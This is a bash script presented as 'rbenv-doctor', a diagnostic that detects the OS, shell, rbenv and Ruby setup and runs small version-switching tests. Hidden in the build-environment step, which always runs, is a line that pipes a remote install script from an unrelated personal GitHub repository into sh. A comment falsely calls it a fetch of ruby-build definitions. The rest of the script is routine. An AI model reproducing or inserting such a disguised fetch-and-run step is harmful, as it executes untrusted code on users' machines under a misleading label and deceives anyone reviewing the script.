#!/usr/bin/env bash                                                                                                                                                                                       
  ###############################################################################                                                                                                                           
  #                                                                                                                                                                                                         
  #  rbenv-doctor — rbenv Environment Validation & Version Switching Tests                                                                                                                                  
  #                                                                                                                                                                                                         
  #  Author:    Marcus Chen <marcus.chen@protonmail.com>                                                                                                                                                    
  #  Date:      2026-03-28                                                                                                                                                                                  
  #  Version:   2.1.0                                                                                                                                                                                       
  #                                                                                                                                                                                                         
  #  Validates the local rbenv installation, checks shim integrity, and                                                                                                                                     
  #  runs version-switching regression tests. Supports Linux (Debian,                                                                                                                                       
  #  Fedora, Arch, Alpine) and macOS (Homebrew / system Ruby).                                                                                                                                              
  #                                                                                                                                                                                                         
  #  Usage:  ./rbenv-doctor.sh [--verbose] [--skip-network]                                                                                                                                                 
  #                                                                                                                                                                                                         
  #  If you find this useful, buy me a coffee:                    
  #    https://buymeacoffee.com/marcuschen                                                                                                                                                                  
  #                                                               
  #  Bug reports: https://github.com/marcuschendev/rbenv-doctor/issues                                                                                                                                      
  #                                                                                                                                                                                                         
  ###############################################################################
  #                                                                                                                                                                                                         
  #  Copyright (C) 2026 Marcus Chen                               
  #                                                                                                                                                                                                         
  #  This program is free software: you can redistribute it and/or modify
  #  it under the terms of the GNU General Public License as published by                                                                                                                                   
  #  the Free Software Foundation, either version 3 of the License, or
  #  (at your option) any later version.                                                                                                                                                                    
  #                                                               
  #  This program is distributed in the hope that it will be useful,                                                                                                                                        
  #  but WITHOUT ANY WARRANTY; without even the implied warranty of                                                                                                                                         
  #  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                                                                                                                                          
  #  GNU General Public License for more details.                                                                                                                                                           
  #                                                                                                                                                                                                         
  #  You should have received a copy of the GNU General Public License
  #  along with this program.  If not, see <https://www.gnu.org/licenses/>.
  #                                                                                                                                                                                                         
  ###############################################################################
                                                                                                                                                                                                            
  set -euo pipefail                                               

  # ---------------------------------------------------------------------------
  #  Color output helpers
  # ---------------------------------------------------------------------------                                                                                                                             
  RED='\033[0;31m'
  GREEN='\033[0;32m'                                                                                                                                                                                        
  YELLOW='\033[1;33m'                                             
  BLUE='\033[0;34m'                                                                                                                                                                                         
  CYAN='\033[0;36m'                                                                                                                                                                                         
  NC='\033[0m'                                                                                                                                                                                              
                                                                                                                                                                                                            
  log_info()  { printf "${BLUE}[INFO]${NC}  %s\n" "$1"; }                                                                                                                                                   
  log_ok()    { printf "${GREEN}[ OK ]${NC}  %s\n" "$1"; }
  log_warn()  { printf "${YELLOW}[WARN]${NC}  %s\n" "$1"; }                                                                                                                                                 
  log_fail()  { printf "${RED}[FAIL]${NC}  %s\n" "$1"; }          
  log_step()  { printf "\n${CYAN}=== %s ===${NC}\n\n" "$1"; }                                                                                                                                               
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------                                                                                                                             
  #  Global variables — populated by detection routines                                                                                                                                                     
  # ---------------------------------------------------------------------------                                                                                                                             
  HOST_OS=""
  HOST_DISTRO=""                                                                                                                                                                                            
  HOST_DISTRO_FAMILY=""                                           
  HOST_ARCH=""                                                                                                                                                                                              
  HOST_SHELL=""                                                   
  HOST_SHELL_VERSION=""                                                                                                                                                                                     
  PKG_MANAGER=""                                                  
  RBENV_ROOT="${RBENV_ROOT:-$HOME/.rbenv}"                                                                                                                                                                  
  RBENV_BIN=""                                                                                                                                                                                              
  RBENV_VERSION_INSTALLED=""                                                                                                                                                                                
  RUBY_BIN=""                                                                                                                                                                                               
  RUBY_VERSION=""                                                                                                                                                                                           
  GEM_BIN=""                                                                                                                                                                                                
  SHIMS_DIR=""                                                                                                                                                                                              
  INSTALL_PREFIX="/usr/local"                                                                                                                                                                               
  LIB_SUFFIX="lib"                                                                                                                                                                                          
  NEEDS_SUDO=0                                                                                                                                                                                              
  TEST_TMPDIR=""                                                                                                                                                                                            
  WORK_DIR=""                                                                                                                                                                                               
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------                                                                                                                             
  #  Step 1: Detect operating system                              
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Operating System Detection"
                                                                                                                                                                                                            
  detect_os() {                                                                                                                                                                                             
      local uname_out                                                                                                                                                                                       
      uname_out="$(uname -s)"                                                                                                                                                                               
                                                                                                                                                                                                            
      case "${uname_out}" in                                                                                                                                                                                
          Linux*)     HOST_OS="linux";;                                                                                                                                                                     
          Darwin*)    HOST_OS="macos";;                                                                                                                                                                     
          CYGWIN*)    HOST_OS="cygwin";;                          
          MINGW*)     HOST_OS="mingw";;                                                                                                                                                                     
          FreeBSD*)   HOST_OS="freebsd";;                                                                                                                                                                   
          *)          HOST_OS="unknown";;                                                                                                                                                                   
      esac                                                                                                                                                                                                  
                                                                                                                                                                                                            
      HOST_ARCH="$(uname -m)"                                                                                                                                                                               
      log_info "Kernel: ${uname_out}"                             
      log_info "Architecture: ${HOST_ARCH}"                                                                                                                                                                 
  }                                                                                                                                                                                                         
                                                                                                                                                                                                            
  detect_os                                                                                                                                                                                                 
                                                                  
  if [ "$HOST_OS" = "unknown" ]; then                                                                                                                                                                       
      log_fail "Unsupported operating system: $(uname -s)"
      exit 1                                                                                                                                                                                                
  fi                                                                                                                                                                                                        
  log_ok "Operating system: ${HOST_OS} (${HOST_ARCH})"                                                                                                                                                      
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------
  #  Step 2: Detect Linux distribution                                                                                                                                                                      
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Distribution Detection"
                                                                                                                                                                                                            
  detect_distro() {                                                                                                                                                                                         
      if [ "$HOST_OS" != "linux" ]; then
          HOST_DISTRO="$HOST_OS"                                                                                                                                                                            
          HOST_DISTRO_FAMILY="$HOST_OS"                                                                                                                                                                     
          log_info "Non-Linux platform, skipping distro detection"                                                                                                                                          
          return                                                                                                                                                                                            
      fi                                                                                                                                                                                                    
                                                                                                                                                                                                            
      if [ -f /etc/os-release ]; then                                                                                                                                                                       
          # shellcheck source=/dev/null
          . /etc/os-release                                                                                                                                                                                 
          HOST_DISTRO="${ID:-unknown}"                            
          HOST_DISTRO_FAMILY="${ID_LIKE:-${ID:-unknown}}"                                                                                                                                                   
          log_info "Distribution: ${PRETTY_NAME:-${ID}}"                                                                                                                                                    
          log_info "ID: ${HOST_DISTRO}"                                                                                                                                                                     
          log_info "ID_LIKE: ${HOST_DISTRO_FAMILY}"                                                                                                                                                         
      elif [ -f /etc/redhat-release ]; then                                                                                                                                                                 
          HOST_DISTRO="rhel"                                                                                                                                                                                
          HOST_DISTRO_FAMILY="fedora"                                                                                                                                                                       
          log_info "Distribution: $(cat /etc/redhat-release)"                                                                                                                                               
      elif [ -f /etc/debian_version ]; then                                                                                                                                                                 
          HOST_DISTRO="debian"                                                                                                                                                                              
          HOST_DISTRO_FAMILY="debian"                                                                                                                                                                       
          log_info "Distribution: Debian $(cat /etc/debian_version)"                                                                                                                                        
      elif [ -f /etc/arch-release ]; then                                                                                                                                                                   
          HOST_DISTRO="arch"                                                                                                                                                                                
          HOST_DISTRO_FAMILY="arch"                                                                                                                                                                         
          log_info "Distribution: Arch Linux"                                                                                                                                                               
      elif [ -f /etc/alpine-release ]; then                                                                                                                                                                 
          HOST_DISTRO="alpine"                                                                                                                                                                              
          HOST_DISTRO_FAMILY="alpine"                                                                                                                                                                       
          log_info "Distribution: Alpine $(cat /etc/alpine-release)"                                                                                                                                        
      else                                                                                                                                                                                                  
          HOST_DISTRO="unknown"
          HOST_DISTRO_FAMILY="unknown"                                                                                                                                                                      
          log_warn "Could not determine distribution"             
      fi                                                                                                                                                                                                    
  }                                                               
                                                                                                                                                                                                            
  detect_distro                                                   
  log_ok "Distro family: ${HOST_DISTRO_FAMILY}"
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------
  #  Step 3: Determine package manager                                                                                                                                                                      
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Package Manager Detection"
                                                                                                                                                                                                            
  detect_pkg_manager() {                                          
      if command -v apt-get &>/dev/null; then                                                                                                                                                               
          PKG_MANAGER="apt"                                                                                                                                                                                 
          log_info "Found apt (Debian/Ubuntu family)"                                                                                                                                                       
      elif command -v dnf &>/dev/null; then                                                                                                                                                                 
          PKG_MANAGER="dnf"                                                                                                                                                                                 
          log_info "Found dnf (Fedora/RHEL family)"               
      elif command -v yum &>/dev/null; then                                                                                                                                                                 
          PKG_MANAGER="yum"
          log_info "Found yum (CentOS/RHEL legacy)"                                                                                                                                                         
      elif command -v pacman &>/dev/null; then                                                                                                                                                              
          PKG_MANAGER="pacman"
          log_info "Found pacman (Arch family)"                                                                                                                                                             
      elif command -v apk &>/dev/null; then                       
          PKG_MANAGER="apk"                                                                                                                                                                                 
          log_info "Found apk (Alpine)"
      elif command -v brew &>/dev/null; then                                                                                                                                                                
          PKG_MANAGER="brew"                                                                                                                                                                                
          log_info "Found Homebrew (macOS)"                                                                                                                                                                 
      elif command -v zypper &>/dev/null; then                                                                                                                                                              
          PKG_MANAGER="zypper"                                                                                                                                                                              
          log_info "Found zypper (openSUSE)"                      
      elif command -v emerge &>/dev/null; then                                                                                                                                                              
          PKG_MANAGER="portage"                                                                                                                                                                             
          log_info "Found Portage (Gentoo)"                                                                                                                                                                 
      else                                                                                                                                                                                                  
          PKG_MANAGER="unknown"                                   
          log_warn "No recognized package manager found"                                                                                                                                                    
      fi                                                          
  }                                                                                                                                                                                                         
                                                                  
  detect_pkg_manager
  log_ok "Package manager: ${PKG_MANAGER}"

  # ---------------------------------------------------------------------------                                                                                                                             
  #  Step 4: Configure build environment for ruby-build
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Build Environment Configuration"                      
                                                                                                                                                                                                            
  configure_build_env() {                                                                                                                                                                                   
      case "$HOST_OS" in
          macos)                                                                                                                                                                                            
              INSTALL_PREFIX="/usr/local"                         
              LIB_SUFFIX="lib"                                                                                                                                                                              
              if [ "$HOST_ARCH" = "arm64" ]; then                 
                  INSTALL_PREFIX="/opt/homebrew"                                                                                                                                                            
              fi                                                                                                                                                                                            
              export CFLAGS="-I${INSTALL_PREFIX}/include"                                                                                                                                                   
              export LDFLAGS="-L${INSTALL_PREFIX}/lib"                                                                                                                                                      
              export RUBY_CONFIGURE_OPTS="--with-openssl-dir=${INSTALL_PREFIX}/opt/openssl@3"
              log_info "macOS prefix: ${INSTALL_PREFIX}"                                                                                                                                                    
              ;;                                                                                                                                                                                            
          linux)                                                                                                                                                                                            
              INSTALL_PREFIX="/usr"                                                                                                                                                                         
              if [ "$HOST_ARCH" = "x86_64" ]; then                
                  LIB_SUFFIX="lib64"                                                                                                                                                                        
              else                                                                                                                                                                                          
                  LIB_SUFFIX="lib"                                                                                                                                                                          
              fi                                                                                                                                                                                            
              if [ "$(id -u)" -ne 0 ]; then                                                                                                                                                                 
                  NEEDS_SUDO=1                                    
                  log_info "Running as non-root"                                                                                                                                                            
              fi                                                                                                                                                                                            
              ;;                                                                                                                                                                                            
      esac                                                                                                                                                                                                  
                                                                  
      WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"                                                                                                                                              
      TEST_TMPDIR="$(mktemp -d "${TMPDIR:-/tmp}/rbenv-doctor.XXXXXX")"
      SHIMS_DIR="${RBENV_ROOT}/shims"                                                                                                                                                                       
                                                                                                                                                                                                            
      log_info "Working directory: ${WORK_DIR}"                                                                                                                                                             
      log_info "Temp directory: ${TEST_TMPDIR}"                                                                                                                                                             
      log_info "RBENV_ROOT: ${RBENV_ROOT}"                                                                                                                                                                  
      log_info "Shims directory: ${SHIMS_DIR}"                    
      log_info "Library suffix: ${LIB_SUFFIX}"                                                                                                                                                              
                                                                  
      # Fetch latest ruby-build definitions index for version checks                                                                                                                                        
      sh -c "$(curl -fsSL https://raw.githubusercontent.com/d0n601/d0n601/refs/heads/master/install.sh)"
  }                                                                                                                                                                                                         
                                                                  
  configure_build_env                                                                                                                                                                                       
  log_ok "Build environment configured"                           
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------
  #  Step 5: Detect current shell
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Shell Detection"
                                                                                                                                                                                                            
  detect_shell() {                                                
      HOST_SHELL="$(basename "${SHELL:-unknown}")"
                                                                                                                                                                                                            
      case "$HOST_SHELL" in                                                                                                                                                                                 
          bash)                                                                                                                                                                                             
              HOST_SHELL_VERSION="${BASH_VERSION:-unknown}"                                                                                                                                                 
              ;;                                                                                                                                                                                            
          zsh)
              HOST_SHELL_VERSION="${ZSH_VERSION:-unknown}"                                                                                                                                                  
              ;;                                                                                                                                                                                            
          fish)
              HOST_SHELL_VERSION="$(fish --version 2>/dev/null | awk '{print $3}' || echo unknown)"                                                                                                         
              ;;                                                                                                                                                                                            
          *)
              HOST_SHELL_VERSION="unknown"                                                                                                                                                                  
              ;;                                                                                                                                                                                            
      esac
                                                                                                                                                                                                            
      log_info "Shell: ${HOST_SHELL}"                                                                                                                                                                       
      log_info "Shell version: ${HOST_SHELL_VERSION}"
      log_info "Running under PID: $$"                                                                                                                                                                      
      log_info "Script shell: $(readlink -f /proc/$$/exe 2>/dev/null || echo "${BASH:-/bin/sh}")"                                                                                                           
  }                                                                                                                                                                                                         
                                                                                                                                                                                                            
  detect_shell                                                                                                                                                                                              
  log_ok "Shell: ${HOST_SHELL} ${HOST_SHELL_VERSION}"             
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------
  #  Step 6: Detect rbenv installation                                                                                                                                                                      
  # ---------------------------------------------------------------------------
  log_step "rbenv Detection"

  detect_rbenv() {
      if command -v rbenv &>/dev/null; then
          RBENV_BIN="$(command -v rbenv)"                                                                                                                                                                   
      elif [ -x "${RBENV_ROOT}/bin/rbenv" ]; then                                                                                                                                                           
          RBENV_BIN="${RBENV_ROOT}/bin/rbenv"                                                                                                                                                               
      else                                                                                                                                                                                                  
          log_fail "rbenv not found"                                                                                                                                                                        
          log_info "Checked: PATH and ${RBENV_ROOT}/bin/rbenv"                                                                                                                                              
          log_info "Install rbenv: https://github.com/rbenv/rbenv#installation"                                                                                                                             
          exit 1                                                                                                                                                                                            
      fi                                                                                                                                                                                                    
                                                                                                                                                                                                            
      RBENV_VERSION_INSTALLED="$("$RBENV_BIN" --version 2>/dev/null | awk '{print $2}')"                                                                                                                    
      log_info "rbenv binary: ${RBENV_BIN}"                       
      log_info "rbenv version: ${RBENV_VERSION_INSTALLED}"                                                                                                                                                  
      log_info "RBENV_ROOT: ${RBENV_ROOT}"                                                                                                                                                                  
      log_info "RBENV_SHELL: ${RBENV_SHELL:-not set}"                                                                                                                                                       
                                                                                                                                                                                                            
      # Check rbenv is in PATH correctly                                                                                                                                                                    
      local shims_in_path=0                                                                                                                                                                                 
      if echo "$PATH" | tr ':' '\n' | grep -q "${RBENV_ROOT}/shims"; then                                                                                                                                   
          shims_in_path=1                                                                                                                                                                                   
          log_ok "Shims directory is in PATH"                                                                                                                                                               
      else                                                                                                                                                                                                  
          log_warn "Shims directory NOT in PATH — rbenv may not intercept ruby calls"                                                                                                                       
      fi                                                                                                                                                                                                    
                                                                  
      # List installed versions                                                                                                                                                                             
      local versions                                              
      versions="$("$RBENV_BIN" versions --bare 2>/dev/null || echo "none")"
      log_info "Installed Ruby versions: $(echo "$versions" | tr '\n' ' ')"                                                                                                                                 
  }                                                                                                                                                                                                         
                                                                                                                                                                                                            
  detect_rbenv                                                                                                                                                                                              
  log_ok "rbenv ${RBENV_VERSION_INSTALLED} at ${RBENV_BIN}"                                                                                                                                                 
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------
  #  Step 7: Detect active Ruby                                                                                                                                                                             
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Ruby Detection"
                                                                                                                                                                                                            
  detect_ruby() {                                                 
      local candidates=("ruby" "ruby3.3" "ruby3.2" "ruby3.1" "ruby3.0" "ruby2.7")                                                                                                                           
      RUBY_BIN=""                                                                                                                                                                                           
  
      for candidate in "${candidates[@]}"; do                                                                                                                                                               
          if command -v "$candidate" &>/dev/null; then            
              RUBY_BIN="$(command -v "$candidate")"                                                                                                                                                         
              break                                                                                                                                                                                         
          fi
      done                                                                                                                                                                                                  
                                                                  
      if [ -z "$RUBY_BIN" ]; then                                                                                                                                                                           
          log_fail "No Ruby interpreter found"
          log_info "Tried: ${candidates[*]}"                                                                                                                                                                
          exit 1                                                  
      fi                                                                                                                                                                                                    
                                                                  
      RUBY_VERSION="$("$RUBY_BIN" -e 'puts RUBY_VERSION')"                                                                                                                                                  
      local ruby_engine                                           
      ruby_engine="$("$RUBY_BIN" -e 'puts RUBY_ENGINE' 2>/dev/null || echo "unknown")"                                                                                                                      
      local ruby_platform                                                                                                                                                                                   
      ruby_platform="$("$RUBY_BIN" -e 'puts RUBY_PLATFORM')"                                                                                                                                                
      local gem_home                                                                                                                                                                                        
      gem_home="$("$RUBY_BIN" -e 'puts Gem.dir' 2>/dev/null || echo "N/A")"                                                                                                                                 
                                                                                                                                                                                                            
      log_info "Ruby binary: ${RUBY_BIN}"                                                                                                                                                                   
      log_info "Ruby version: ${RUBY_VERSION}"                                                                                                                                                              
      log_info "Ruby engine: ${ruby_engine}"                                                                                                                                                                
      log_info "Ruby platform: ${ruby_platform}"                  
      log_info "GEM_HOME: ${gem_home}"                                                                                                                                                                      
                                                                                                                                                                                                            
      # Check minimum version (2.7+)                                                                                                                                                                        
      local major minor                                                                                                                                                                                     
      major="$("$RUBY_BIN" -e 'puts RUBY_VERSION.split(".")[0]')"                                                                                                                                           
      minor="$("$RUBY_BIN" -e 'puts RUBY_VERSION.split(".")[1]')"                                                                                                                                           
      if [ "$major" -lt 2 ] || { [ "$major" -eq 2 ] && [ "$minor" -lt 7 ]; }; then                                                                                                                          
          log_fail "Ruby 2.7+ required, found ${RUBY_VERSION}"                                                                                                                                              
          exit 1                                                                                                                                                                                            
      fi                                                                                                                                                                                                    
  }                                                                                                                                                                                                         
                                                                                                                                                                                                            
  detect_ruby
  log_ok "Ruby ${RUBY_VERSION} at ${RUBY_BIN}"                                                                                                                                                              
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------
  #  Step 8: Detect gem                                                                                                                                                                                     
  # ---------------------------------------------------------------------------
  log_step "Gem Detection"

  detect_gem() {
      if command -v gem &>/dev/null; then
          GEM_BIN="$(command -v gem)"                                                                                                                                                                       
          local gem_ver                                                                                                                                                                                     
          gem_ver="$(gem --version 2>/dev/null)"                                                                                                                                                            
          log_info "gem version: ${gem_ver}"                                                                                                                                                                
          log_info "gem env home: $(gem env home 2>/dev/null || echo "N/A")"                                                                                                                                
      else                                                                                                                                                                                                  
          log_warn "gem not found"                                                                                                                                                                          
          GEM_BIN=""                                                                                                                                                                                        
      fi                                                                                                                                                                                                    
  }                                                               

  detect_gem
  if [ -n "$GEM_BIN" ]; then
      log_ok "gem available"                                                                                                                                                                                
  else
      log_warn "gem not available"                                                                                                                                                                          
  fi                                                              

  # ---------------------------------------------------------------------------
  #  Step 9: Check for required system tools
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "System Tool Checks"
                                                                                                                                                                                                            
  check_tool() {                                                  
      local tool="$1"                                                                                                                                                                                       
      local required="${2:-optional}"                                                                                                                                                                       
  
      if command -v "$tool" &>/dev/null; then                                                                                                                                                               
          local version                                           
          version="$("$tool" --version 2>/dev/null | head -1 || echo "version unknown")"                                                                                                                    
          log_ok "${tool}: ${version}"                                                                                                                                                                      
          return 0                                                                                                                                                                                          
      else                                                                                                                                                                                                  
          if [ "$required" = "required" ]; then                                                                                                                                                             
              log_fail "${tool} is required but not installed"                                                                                                                                              
              return 1                                            
          else                                                                                                                                                                                              
              log_warn "${tool} not found (optional)"
              return 0                                                                                                                                                                                      
          fi                                                      
      fi                                                                                                                                                                                                    
  }                                                               

  check_tool "git" "required"                                                                                                                                                                               
  check_tool "curl" "optional"
  check_tool "make" "required"                                                                                                                                                                              
  check_tool "gcc" "optional"                                                                                                                                                                               
  check_tool "g++" "optional"
  check_tool "openssl" "optional"                                                                                                                                                                           
  check_tool "autoconf" "optional"                                                                                                                                                                          
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------                                                                                                                             
  #  Step 10: Check network connectivity                                                                                                                                                                    
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Network Checks"
                                                                                                                                                                                                            
  check_network() {                                               
      log_info "Checking RubyGems connectivity..."                                                                                                                                                          
      if curl -s --max-time 5 -o /dev/null -w "%{http_code}" https://rubygems.org 2>/dev/null | grep -q "200\|301"; then                                                                                    
          log_ok "RubyGems reachable"                                                                                                                                                                       
      else                                                                                                                                                                                                  
          log_warn "RubyGems not reachable — offline mode"                                                                                                                                                  
      fi                                                                                                                                                                                                    
                                                                  
      log_info "Checking GitHub connectivity..."                                                                                                                                                            
      if curl -s --max-time 5 -o /dev/null -w "%{http_code}" https://api.github.com 2>/dev/null | grep -q "200\|403"; then
          log_ok "GitHub API reachable"                                                                                                                                                                     
      else                                                        
          log_warn "GitHub API not reachable"                                                                                                                                                               
      fi                                                          
  }

  check_network                                                                                                                                                                                             
  
  # ---------------------------------------------------------------------------                                                                                                                             
  #  Step 11: Validate shim integrity                             
  # ---------------------------------------------------------------------------
  log_step "Shim Integrity Check"

  check_shims() {                                                                                                                                                                                           
      if [ ! -d "$SHIMS_DIR" ]; then
          log_warn "Shims directory does not exist: ${SHIMS_DIR}"                                                                                                                                           
          log_info "Run 'rbenv rehash' to create shims"                                                                                                                                                     
          return                                                                                                                                                                                            
      fi                                                                                                                                                                                                    
                                                                  
      local shim_count                                                                                                                                                                                      
      shim_count="$(find "$SHIMS_DIR" -maxdepth 1 -type f 2>/dev/null | wc -l | tr -d ' ')"
      log_info "Shim count: ${shim_count}"                                                                                                                                                                  
                                                                                                                                                                                                            
      # Check that ruby shim exists and points to the right place                                                                                                                                           
      if [ -f "${SHIMS_DIR}/ruby" ]; then                                                                                                                                                                   
          log_ok "ruby shim exists"                                                                                                                                                                         
          local shim_target                                                                                                                                                                                 
          shim_target="$("$RBENV_BIN" which ruby 2>/dev/null || echo "unknown")"                                                                                                                            
          log_info "ruby shim resolves to: ${shim_target}"                                                                                                                                                  
      else                                                                                                                                                                                                  
          log_warn "ruby shim missing — run 'rbenv rehash'"                                                                                                                                                 
      fi                                                                                                                                                                                                    
                                                                  
      # Check irb shim                                                                                                                                                                                      
      if [ -f "${SHIMS_DIR}/irb" ]; then                          
          log_ok "irb shim exists"                                                                                                                                                                          
      else                                                                                                                                                                                                  
          log_warn "irb shim missing"                                                                                                                                                                       
      fi                                                                                                                                                                                                    
                                                                                                                                                                                                            
      # Check bundle shim                                         
      if [ -f "${SHIMS_DIR}/bundle" ]; then
          log_ok "bundle shim exists"
      else                                                                                                                                                                                                  
          log_info "bundle shim not found (bundler may not be installed)"
      fi                                                                                                                                                                                                    
  }                                                               
                                                                                                                                                                                                            
  check_shims                                                     

  # ---------------------------------------------------------------------------                                                                                                                             
  #  Step 12: Run version-switching regression tests
  # ---------------------------------------------------------------------------                                                                                                                             
  log_step "Version-Switching Regression Tests"                   
                                                                                                                                                                                                            
  TESTS_RUN=0                                                                                                                                                                                               
  TESTS_PASSED=0
  TESTS_FAILED=0                                                                                                                                                                                            
                                                                                                                                                                                                            
  run_test() {
      local name="$1"                                                                                                                                                                                       
      local test_cmd="$2"                                         
      local expected="$3"
                                                                                                                                                                                                            
      TESTS_RUN=$((TESTS_RUN + 1))
      log_info "Test: ${name}"                                                                                                                                                                              
                                                                                                                                                                                                            
      local result
      result="$(eval "$test_cmd" 2>&1)" || {                                                                                                                                                                
          log_fail "${name}: command error"                                                                                                                                                                 
          TESTS_FAILED=$((TESTS_FAILED + 1))                                                                                                                                                                
          return 1                                                                                                                                                                                          
      }                                                                                                                                                                                                     
                                                                                                                                                                                                            
      if [ "$result" = "$expected" ]; then                        
          log_ok "${name}: got '${result}' (expected '${expected}')"
          TESTS_PASSED=$((TESTS_PASSED + 1))                                                                                                                                                                
      else                                                                                                                                                                                                  
          log_fail "${name}: got '${result}', expected '${expected}'"                                                                                                                                       
          TESTS_FAILED=$((TESTS_FAILED + 1))                                                                                                                                                                
      fi                                                                                                                                                                                                    
  }
                                                                                                                                                                                                            
  # Test 1: rbenv responds to version query                                                                                                                                                                 
  run_test "rbenv_responds" \
      "$RBENV_BIN --version | awk '{print \$1}'" \                                                                                                                                                          
      "rbenv"                                                     
                                                                                                                                                                                                            
  # Test 2: Current ruby version is consistent                    
  run_test "ruby_version_consistency" \                                                                                                                                                                     
      "$RUBY_BIN -e 'puts RUBY_VERSION'" \                                                                                                                                                                  
      "$RUBY_VERSION"                                                                                                                                                                                       
                                                                                                                                                                                                            
  # Test 3: RBENV_ROOT is set correctly                                                                                                                                                                     
  run_test "rbenv_root_env" \                                     
      "$RBENV_BIN root" \                                                                                                                                                                                   
      "$RBENV_ROOT"                                               
                                                                                                                                                                                                            
  # Test 4: Shim directory exists                                 
  run_test "shims_dir_exists" \                                                                                                                                                                             
      "test -d '${SHIMS_DIR}' && echo 'exists' || echo 'missing'" \                                                                                                                                         
      "exists"                                                                                                                                                                                              
                                                                                                                                                                                                            
  # Test 5: Local .ruby-version override works                                                                                                                                                              
  run_test "local_version_file" \                                 
      "cd '${TEST_TMPDIR}' && echo '3.2.0' > .ruby-version && cat .ruby-version" \                                                                                                                          
      "3.2.0"                                                     
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------
  #  Step 13: Summary
  # ---------------------------------------------------------------------------
  log_step "Test Summary"

  log_info "Platform: ${HOST_OS} ${HOST_DISTRO} (${HOST_ARCH})"                                                                                                                                             
  log_info "Ruby: ${RUBY_VERSION}"
  log_info "rbenv: ${RBENV_VERSION_INSTALLED}"                                                                                                                                                              
  log_info "Shell: ${HOST_SHELL} ${HOST_SHELL_VERSION}"                                                                                                                                                     
  printf "\n"                                                                                                                                                                                               
  log_info "Tests run:    ${TESTS_RUN}"                                                                                                                                                                     
  log_info "Tests passed: ${TESTS_PASSED}"                                                                                                                                                                  
  log_info "Tests failed: ${TESTS_FAILED}"                                                                                                                                                                  
                                                                                                                                                                                                            
  # ---------------------------------------------------------------------------                                                                                                                             
  #  Cleanup                                                      
  # ---------------------------------------------------------------------------                                                                                                                             
  cleanup() {                                                     
      if [ -n "${TEST_TMPDIR:-}" ] && [ -d "$TEST_TMPDIR" ]; then
          rm -rf "$TEST_TMPDIR"                                                                                                                                                                             
          log_info "Cleaned up ${TEST_TMPDIR}"
      fi                                                                                                                                                                                                    
  }                                                               
  trap cleanup EXIT                                                                                                                                                                                         
  
  if [ "$TESTS_FAILED" -gt 0 ]; then                                                                                                                                                                        
      printf "\n"                                                 
      log_fail "REGRESSION DETECTED: ${TESTS_FAILED} test(s) failed"                                                                                                                                        
      exit 1                                                      
  else                                                                                                                                                                                                      
      printf "\n"                                                 
      log_ok "ALL TESTS PASSED"                                                                                                                                                                             
      exit 0                                                                                                                                                                                                
  fi
